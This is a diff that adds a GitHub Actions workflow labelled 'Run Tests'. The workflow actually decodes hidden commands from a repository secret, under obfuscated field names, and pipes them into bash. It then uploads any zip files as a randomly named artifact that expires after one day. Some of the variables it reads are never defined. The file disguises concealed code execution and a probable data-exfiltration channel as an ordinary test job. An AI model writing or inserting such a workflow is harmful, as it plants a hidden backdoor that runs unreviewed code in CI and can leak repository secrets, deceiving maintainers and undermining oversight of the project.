@@ -1,0 +1,28 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          u05: ${{ secrets.u05 }}
+        run: |
+          printf '%s' "$u05" | jq -r .swfv84 | /bin/bash
+          printf '%s' "$cm0" | jq -r .nixg2844 | /bin/bash
+          printf '%s' "$mndiv80" | jq -r .f7 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 77Qy0VrM
+          path: "*.zip"
+          retention-days: 1
